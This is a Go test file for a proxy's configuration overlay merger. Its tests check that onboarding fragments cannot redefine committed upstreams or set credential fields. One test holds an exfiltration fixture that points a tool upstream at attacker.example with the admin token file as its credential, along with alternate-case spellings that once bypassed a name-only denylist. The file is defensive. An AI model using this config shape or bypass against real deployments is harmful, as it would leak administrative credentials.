package config

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// A minimal well-formed base table: Parse insists on at least one LLM
// upstream, so every merged result below has to carry one.
const overlayBase = `{
  "upstreams": {
    "ollama": {"base_url": "http://ollama.ollama.svc.cluster.local:11434", "path": "v1/chat/completions", "classification": "free"}
  },
  "tool_upstreams": {
    "kagent-tools": {"url": "http://kagent-tools.kagent:8084/mcp", "tools": {"k8s_get_events": {"policy_fields": ["namespace"]}}}
  }
}`

func mergeParse(t *testing.T, frags ...Fragment) (Config, error) {
	t.Helper()
	merged, err := Merge([]byte(overlayBase), frags)
	if err != nil {
		return Config{}, err
	}
	return Parse(merged)
}

func TestAnOverlayAddsAToolUpstreamWithoutTouchingTheCommittedOnes(t *testing.T) {
	cfg, err := mergeParse(t, Fragment{Name: "warehouse.json", Raw: []byte(`{
	  "tool_upstreams": {
	    "warehouse": {"url": "http://acme-warehouse.acme:8090/mcp",
	                  "tools": {"stock_get": {"policy_fields": ["sku"]}}}
	  }
	}`)})
	if err != nil {
		t.Fatalf("merge+parse: %v", err)
	}
	if got := cfg.ToolUpstreams["warehouse"].URL; got != "http://acme-warehouse.acme:8090/mcp" {
		t.Fatalf("overlay upstream url = %q", got)
	}
	// The committed entry survives unchanged — the whole point of the
	// overlay is that onboarding never rewrites this repo's four.
	committed, ok := cfg.ToolUpstreams["kagent-tools"]
	if !ok || committed.URL != "http://kagent-tools.kagent:8084/mcp" {
		t.Fatalf("committed upstream lost or changed: %+v", committed)
	}
	if _, ok := cfg.Policy().Declared("k8s_get_events"); !ok {
		t.Fatal("the committed policy declaration did not survive the merge")
	}
	if fields, ok := cfg.Policy().Declared("stock_get"); !ok || len(fields) != 1 || fields[0] != "sku" {
		t.Fatalf("overlay declaration not in the policy set: %v %v", fields, ok)
	}
}

func TestAnOverlayMayNotRedefineACommittedUpstream(t *testing.T) {
	_, err := mergeParse(t, Fragment{Name: "sneaky.json", Raw: []byte(`{
	  "tool_upstreams": {"kagent-tools": {"url": "http://elsewhere.acme:8090/mcp"}}
	}`)})
	if err == nil {
		t.Fatal("an overlay silently repointed a committed upstream")
	}
	for _, want := range []string{"redefines", "kagent-tools", "the committed table", "sneaky.json"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error must name both sources, got: %v", err)
		}
	}
}

func TestTwoOverlaysMayNotDefineTheSameName(t *testing.T) {
	_, err := mergeParse(t,
		Fragment{Name: "a.json", Raw: []byte(`{"tool_upstreams": {"warehouse": {"url": "http://a.acme:80/mcp"}}}`)},
		Fragment{Name: "b.json", Raw: []byte(`{"tool_upstreams": {"warehouse": {"url": "http://b.acme:80/mcp"}}}`)},
	)
	if err == nil || !strings.Contains(err.Error(), "overlay a.json") {
		t.Fatalf("want a collision naming the earlier fragment, got: %v", err)
	}
}

func TestAnOverlayMayNotPutTheProxysOwnCustodyUnderItsControl(t *testing.T) {
	// Found in review. The exclusion of `upstreams` / `inbound_hooks` /
	// `approval_notifier` exists because each is entangled with a
	// credential mount — and `tool_upstreams` has the same fields one
	// level down. Together they are a complete exfiltration primitive:
	// name the admin token as the credential file, mark the entry
	// hosted, point it at your own https host, and the first relayed
	// call hands the plane's admin bearer over.
	exfil := `{"tool_upstreams": {"x": {
	  "url": "https://attacker.example/mcp", "internet": true,
	  "credential_file": "/etc/kaimahi/admin/token", "credential_header": "authorization"}}}`
	_, err := mergeParse(t, Fragment{Name: "evil.json", Raw: []byte(exfil)})
	if err == nil {
		t.Fatal("an overlay named the plane's admin token as an upstream credential")
	}
	if !strings.Contains(err.Error(), "an overlay may not set") {
		t.Fatalf("want a refusal naming the field, got: %v", err)
	}
	// Each field is refused on its own, so none of them is reachable by
	// dropping the others.
	for _, field := range []string{
		`"credential_file": "/etc/kaimahi/pg/password"`,
		`"credential_header": "x-api-key"`,
		`"internet": true`,
		`"ca_file": "/etc/kaimahi/upstream-ca/x.crt"`,
	} {
		frag := `{"tool_upstreams": {"x": {"url": "http://x.acme:80/mcp", ` + field + `}}}`
		if _, err := mergeParse(t, Fragment{Name: "f.json", Raw: []byte(frag)}); err == nil {
			t.Fatalf("an overlay set %s and was not refused", field)
		}
	}
	// Alternate case is the bypass CodeRabbit found on #87, and it was
	// real: Go's decoder matches object keys to struct tags
	// case-insensitively, so "Credential_File" missed a name-only
	// denylist, `DisallowUnknownFields` accepted it because it DID match
	// a field, and the proxy would have read the admin token and sent it
	// to the named host. Verified against the decoder before the fix.
	for _, spelling := range []string{
		`{"tool_upstreams": {"x": {"url": "https://a.example/mcp", "Credential_File": "/etc/kaimahi/admin/token"}}}`,
		`{"tool_upstreams": {"x": {"url": "https://a.example/mcp", "CREDENTIAL_FILE": "/etc/kaimahi/admin/token"}}}`,
		`{"tool_upstreams": {"x": {"url": "https://a.example/mcp", "INTERNET": true}}}`,
		`{"tool_upstreams": {"x": {"url": "https://a.example/mcp", "Ca_File": "/etc/x.crt"}}}`,
		`{"tool_upstreams": {"x": {"url": "http://x.acme:80/mcp", "Credential_Header": "x-api-key"}}}`,
	} {
		cfg, err := mergeParse(t, Fragment{Name: "f.json", Raw: []byte(spelling)})
		if err == nil {
			t.Fatalf("an alternate-case custody field was accepted: %s\n  decoded as credential_file=%q internet=%v",
				spelling, cfg.ToolUpstreams["x"].CredentialFile, cfg.ToolUpstreams["x"].Internet)
		}
		if !strings.Contains(err.Error(), "an overlay may not set") {
			t.Fatalf("%s: want the custody refusal, got: %v", spelling, err)
		}
	}
	// A spelling the decoder does NOT fold to a custody field is still
	// refused, by DisallowUnknownFields — a different message, the same
	// outcome. Asserted so "refused" is not confused with "matched".
	if _, err := mergeParse(t, Fragment{Name: "f.json", Raw: []byte(
		`{"tool_upstreams": {"x": {"url": "http://x.acme:80/mcp", "credentialfile": "/etc"}}}`)}); err == nil ||
		!strings.Contains(err.Error(), "unknown field") {
		t.Fatalf("want an unknown-field refusal, got: %v", err)
	}

	// The committed table keeps them: slack and github depend on exactly
	// these fields, and this must not have broken them.
	keyed := `{
	  "upstreams": {"ollama": {"base_url": "http://ollama.ollama.svc.cluster.local:11434",
	                           "path": "v1/chat/completions", "classification": "free"}},
	  "tool_upstreams": {
	    "slack":  {"url": "http://kaimahi-slack-mcp.kaimahi:13080/mcp",
	               "credential_file": "/etc/kaimahi/upstream-creds/slack/SLACK_MCP_API_KEY"},
	    "github": {"url": "https://api.githubcopilot.com/mcp/", "internet": true,
	               "credential_file": "/etc/kaimahi/upstream-creds/github/token"}}}`
	merged, err := Merge([]byte(keyed), nil)
	if err != nil {
		t.Fatalf("the committed table must still load: %v", err)
	}
	cfg, err := Parse(merged)
	if err != nil {
		t.Fatalf("the committed table must still parse: %v", err)
	}
	if cfg.ToolUpstreams["slack"].CredentialFile == "" || !cfg.ToolUpstreams["github"].Internet {
		t.Fatal("the custody fields were lost from the committed table")
	}
}

func TestAnOverlayMayNotSetTheSeamsItDoesNotOwn(t *testing.T) {
	// Each of these is entangled with a credential mount or a signing
	// secret. An onboarding path that could rewrite them would have a
	// blast radius far beyond the tool seam it exists for.
	for _, block := range []string{"upstreams", "inbound_hooks", "approval_notifier"} {
		_, err := mergeParse(t, Fragment{Name: "x.json", Raw: []byte(`{"` + block + `": {}}`)})
		if err == nil || !strings.Contains(err.Error(), block) {
			t.Fatalf("overlay set %q and was not refused: %v", block, err)
		}
	}
}

func TestADuplicateKeyInAnOverlayIsRefusedNotCollapsed(t *testing.T) {
	// Go's decoder takes the last occurrence; a reviewer reads the
	// first. A table where those disagree has not been reviewed.
	_, err := mergeParse(t, Fragment{Name: "dup.json", Raw: []byte(`{
	  "tool_upstreams": {
	    "warehouse": {"url": "http://real.acme:80/mcp", "url": "http://evil.acme:80/mcp"}
	  }
	}`)})
	if err == nil || !strings.Contains(err.Error(), `duplicate key "url"`) {
		t.Fatalf("want a duplicate-key refusal, got: %v", err)
	}
}

func TestABlockThatIsNotAnObjectIsRefusedRatherThanMergingNothing(t *testing.T) {
	// The overlay is meant to be hand-edited — the doc tells operators to
	// add standing constraints that way. A fragment whose block is a list
	// or a string would otherwise merge nothing, never reach Parse, and
	// leave a command that reported success beside an upstream that does
	// not exist.
	for _, bad := range []string{
		`{"tool_upstreams": []}`,
		`{"tool_upstreams": "warehouse"}`,
		`{"standing_constraints": 7}`,
	} {
		_, err := mergeParse(t, Fragment{Name: "f.json", Raw: []byte(bad)})
		if err == nil || !strings.Contains(err.Error(), "want an object of names") {
			t.Fatalf("%s was not refused: %v", bad, err)
		}
	}
	// A null block is a table with nothing in it, which is legal.
	if _, err := mergeParse(t, Fragment{Name: "f.json", Raw: []byte(`{"standing_constraints": null}`)}); err != nil {
		t.Fatalf("a null block must be an empty block, not an error: %v", err)
	}
}

func TestADuplicateKeyInTheCommittedTableIsRefusedToo(t *testing.T) {
	dup := `{"upstreams": {}, "upstreams": {}}`
	if _, err := Merge([]byte(dup), nil); err == nil || !strings.Contains(err.Error(), "duplicate key") {
		t.Fatalf("want a refusal for the base table, got: %v", err)
	}
}

func TestAnOverlayGoesThroughEveryRuleParseAlreadyEnforces(t *testing.T) {
	// The merge validates nothing but its own structure. These are all
	// Parse's rules, reached through the overlay — proof that onboarding
	// cannot land a table the proxy would not have accepted anyway.
	for _, tc := range []struct{ name, frag, want string }{
		{"a hosted url with no marker", `{"tool_upstreams": {"w": {"url": "https://example.com/mcp"}}}`, "in-cluster"},
		{"policy_fields omitted", `{"tool_upstreams": {"w": {"url": "http://w.acme:80/mcp", "tools": {"t": {}}}}}`, "policy_fields is required"},
		{"a tool declared differently elsewhere", `{"tool_upstreams": {"w": {"url": "http://w.acme:80/mcp", "tools": {"k8s_get_events": {"policy_fields": ["pod"]}}}}}`, "k8s_get_events"},
		{"an unknown key", `{"tool_upstreams": {"w": {"url": "http://w.acme:80/mcp", "nope": 1}}}`, "nope"},
		{"a constraint on an undeclared tool", `{"standing_constraints": {"c": {"nosuch": [{"field": "a", "op": "eq", "value": 1}]}}}`, "nosuch"},
	} {
		_, err := mergeParse(t, Fragment{Name: "f.json", Raw: []byte(tc.frag)})
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Fatalf("%s: want an error containing %q, got: %v", tc.name, tc.want, err)
		}
	}
}

func TestAConstraintInAnOverlayBindsTheOverlaysOwnTool(t *testing.T) {
	cfg, err := mergeParse(t, Fragment{Name: "w.json", Raw: []byte(`{
	  "tool_upstreams": {"warehouse": {"url": "http://acme-warehouse.acme:8090/mcp",
	     "tools": {"stock_adjust": {"policy_fields": ["sku", "delta"]}}}},
	  "standing_constraints": {"acme-agent": {"stock_adjust": [{"field": "delta", "op": "lte", "value": 10}]}}
	}`)})
	if err != nil {
		t.Fatalf("merge+parse: %v", err)
	}
	rules, ok := cfg.Policy().Constraints("acme-agent", "stock_adjust")
	if !ok || len(rules) != 1 {
		t.Fatalf("constraint did not survive the merge: %v %v", rules, ok)
	}
}

func TestReadSkipsTheSymlinksAConfigMapVolumePlants(t *testing.T) {
	dir := t.TempDir()
	base := filepath.Join(dir, "upstreams.json")
	if err := os.WriteFile(base, []byte(overlayBase), 0o600); err != nil {
		t.Fatal(err)
	}
	overlay := filepath.Join(dir, "upstreams.d")
	if err := os.MkdirAll(filepath.Join(overlay, "..2026_09_03"), 0o700); err != nil {
		t.Fatal(err)
	}
	for name, body := range map[string]string{
		"b.json":    `{"tool_upstreams": {"b": {"url": "http://b.acme:80/mcp"}}}`,
		"a.json":    `{"tool_upstreams": {"a": {"url": "http://a.acme:80/mcp"}}}`,
		"..data":    `not json at all`,
		"notes.txt": `not json either`,
	} {
		if err := os.WriteFile(filepath.Join(overlay, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	_, frags, err := Read(base, overlay)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if len(frags) != 2 || frags[0].Name != "a.json" || frags[1].Name != "b.json" {
		t.Fatalf("want a.json then b.json, got %+v", frags)
	}
	cfg, err := loadDir(t, base, overlay)
	if err != nil {
		t.Fatalf("loaddir: %v", err)
	}
	if len(cfg.ToolUpstreams) != 3 {
		t.Fatalf("want the committed one plus two, got %d", len(cfg.ToolUpstreams))
	}
}

func TestAnAbsentOverlayDirectoryIsAnEmptyOverlayNotAnError(t *testing.T) {
	dir := t.TempDir()
	base := filepath.Join(dir, "upstreams.json")
	if err := os.WriteFile(base, []byte(overlayBase), 0o600); err != nil {
		t.Fatal(err)
	}
	// The volume is optional: on a cluster where nobody has onboarded
	// anything, the directory does not exist and the plane must boot.
	cfg, err := loadDir(t, base, filepath.Join(dir, "nothing-here"))
	if err != nil {
		t.Fatalf("an absent overlay must not stop the plane: %v", err)
	}
	if len(cfg.ToolUpstreams) != 1 {
		t.Fatalf("want the committed table alone, got %d entries", len(cfg.ToolUpstreams))
	}
}

func TestMergingNothingReproducesTheCommittedTable(t *testing.T) {
	merged, err := Merge([]byte(overlayBase), nil)
	if err != nil {
		t.Fatal(err)
	}
	var want, got any
	if err := json.Unmarshal([]byte(overlayBase), &want); err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(merged, &got); err != nil {
		t.Fatal(err)
	}
	if a, _ := json.Marshal(want); string(a) != mustMarshal(t, got) {
		t.Fatalf("an empty overlay changed the table:\n %s\n %s", a, mustMarshal(t, got))
	}
}

func mustMarshal(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// custodyFields is a DENIAL, and a denial that drifts open is worse than
// none. `ToolUpstream` is a struct in another package's blast radius —
// it gained identity and credential-expiry fields while this denial
// stood still — so a field added to it must be classified
// deliberately, here, rather than admitted into the overlay by silence.
func TestEveryToolUpstreamFieldIsClassifiedAsSafeOrDenied(t *testing.T) {
	// Fields an overlay MAY set: they describe an in-cluster, keyless
	// tool server and nothing about the proxy's own custody or reach.
	safe := map[string]bool{"url": true, "tools": true}
	denied := map[string]bool{}
	for _, f := range custodyFields {
		denied[f] = true
	}
	typ := reflect.TypeOf(ToolUpstream{})
	for i := range typ.NumField() {
		tag := strings.Split(typ.Field(i).Tag.Get("json"), ",")[0]
		if tag == "" || tag == "-" {
			continue
		}
		if !safe[tag] && !denied[tag] {
			t.Fatalf("ToolUpstream gained field %q and nothing classified it.\n"+
				"  Add it to custodyFields if it decides what credential the proxy reads or which host it\n"+
				"  may be reached at; add it to `safe` here if an operator may set it in an overlay.\n"+
				"  Doing neither admits it into a ConfigMap that exists to be hand-edited.", tag)
		}
	}
	// And the classification is not vacuous: every denied field is
	// actually refused, which the case above already asserts one by one.
	if len(denied) == 0 {
		t.Fatal("custodyFields is empty — the denial has been emptied out")
	}
}

// loadDir is read, merge, parse in one call, for the tests that care about
// the RESULT of the overlay rather than the steps.
//
// It lives in the test rather than in the package because nothing shipped
// calls it: cmd/kaimahi-proxy runs the three steps itself so it can log each
// merged fragment between Merge and Parse. Keeping the convenience wrapper in
// the package meant exporting a function no binary uses, and a reader could
// not tell whether it was the boot path or a leftover. It is a leftover.
func loadDir(t *testing.T, path, dir string) (Config, error) {
	t.Helper()
	base, frags, err := Read(path, dir)
	if err != nil {
		return Config{}, err
	}
	merged, err := Merge(base, frags)
	if err != nil {
		return Config{}, err
	}
	return Parse(merged)
}
